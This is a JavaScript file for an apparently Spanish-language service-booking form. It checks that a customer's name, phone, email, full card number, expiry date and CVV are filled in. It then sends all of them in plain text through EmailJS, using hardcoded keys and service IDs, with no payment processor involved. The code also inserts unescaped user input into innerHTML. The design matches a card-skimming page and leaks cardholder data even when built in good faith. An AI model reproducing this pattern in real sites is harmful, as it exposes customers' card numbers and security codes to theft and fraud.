// Initialize EmailJS SDK
emailjs.init("HKiIThGpeT7T6eLPK");

// Show SweetAlert error
function showError(title, html) {
  Swal.fire({ icon: "error", title, html });
}

// Return list of missing fields
function getMissingFields() {
  const fields = [
    { id: "fullName", name: "Nombre" },
    { id: "phone", name: "Teléfono" },
    { id: "email", name: "Correo" },
    { id: "cardName", name: "Nombre de tarjeta" },
    { id: "cardNumber", name: "Número de tarjeta" },
    { id: "expDate", name: "Fecha de vencimiento" },
    { id: "cvv", name: "CVV" },
    { id: "serviceDate", name: "Fecha de servicio" },
  ];
  const missing = fields.filter((f) => !document.getElementById(f.id).value).map((f) => f.name);

  if (!document.querySelector('input[name="plan"]:checked')) missing.push("Plan");
  if (!document.querySelector('input[name="serviceTime"]:checked')) missing.push("Hora");

  return missing;
}

// Email format validation
function isEmailValid(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// Card number validation (exactly 16 digits)
function isCardValid(num) {
  return num.replace(/\D/g, "").length === 16;
}

// Check if card is expired (returns true if expired)
function isExpired(year, month) {
  const now = new Date();
  const exp = new Date(year, month - 1);
  return exp < new Date(now.getFullYear(), now.getMonth());
}

// Gather all form values into an object for EmailJS
function collectParams() {
  const form = document.getElementById("serviceForm");
  const rawCard = form.cardNumber.value;
  return {
    fullName: form.fullName.value,
    phone: form.phone.value,
    email: form.email.value,
    cardName: form.cardName.value,
    cardNumber: rawCard.replace(/(\d{4})(?=\d)/g, "$1 "),
    expDate: form.expDate.value,
    cvv: form.cvv.value,
    plan: document.querySelector('input[name="plan"]:checked').value,
    serviceDate: form.serviceDate.value,
    serviceTime: document.querySelector('input[name="serviceTime"]:checked').value,
  };
}

// Populate and show the confirmation modal
function showConfirmation(params) {
  const body = document.getElementById("confirmBody");
  body.innerHTML = `
    <p><strong>Nombre:</strong> ${params.fullName}</p>
    <p><strong>Teléfono:</strong> ${params.phone}</p>
    <p><strong>Correo:</strong> ${params.email}</p>
    <p><strong>Plan:</strong> ${params.plan}</p>
    <p><strong>Fecha y hora de servicio:</strong> ${params.serviceDate} ${params.serviceTime}</p>
  `;
  new bootstrap.Modal(document.getElementById("confirmModal")).show();
}

// Send the email via EmailJS
function sendEmail(params) {
  return emailjs.send("service_blppxsc", "template_d9ghdqa", params, "HKiIThGpeT7T6eLPK");
}

// Store the parameters between steps
let currentParams = null;

// 1) Validate & open modal when clicking "Agendar servicio"
document.getElementById("openModalBtn").addEventListener("click", () => {
  const missing = getMissingFields();
  if (missing.length) {
    const list = missing.map((m) => `<li>${m}</li>`).join("");
    showError("Campos faltantes", `<ul>${list}</ul>`);
    return;
  }
  const email = document.getElementById("email").value;
  if (!isEmailValid(email)) {
    showError("Correo inválido", "Ingrese un correo válido.");
    return;
  }
  const rawCard = document.getElementById("cardNumber").value;
  if (!isCardValid(rawCard)) {
    showError("Tarjeta inválida", "Debe tener 16 dígitos.");
    return;
  }
  const [yy, mm] = document.getElementById("expDate").value.split("-").map(Number);
  if (isExpired(yy, mm)) {
    showError("Fecha inválida", "Tarjeta vencida.");
    return;
  }

  // All validations passed → collect params and show modal
  currentParams = collectParams();
  showConfirmation(currentParams);
});

// 2) Send form when clicking "Confirmar" in the modal
document.getElementById("confirmSubmitBtn").addEventListener("click", async () => {
  const modalEl = document.getElementById("confirmModal");
  const bsModal = bootstrap.Modal.getInstance(modalEl);

  try {
    const res = await sendEmail(currentParams);
    console.log("Correo enviado", res.status, res.text);
    bsModal.hide();
    Swal.fire({ icon: "success", title: "¡Solicitud enviada!" });
  } catch (err) {
    console.error("Error EmailJS", err);
    Swal.fire({
      icon: "error",
      title: "Error al enviar",
      text: "Intente de nuevo más tarde.",
    });
  }
});


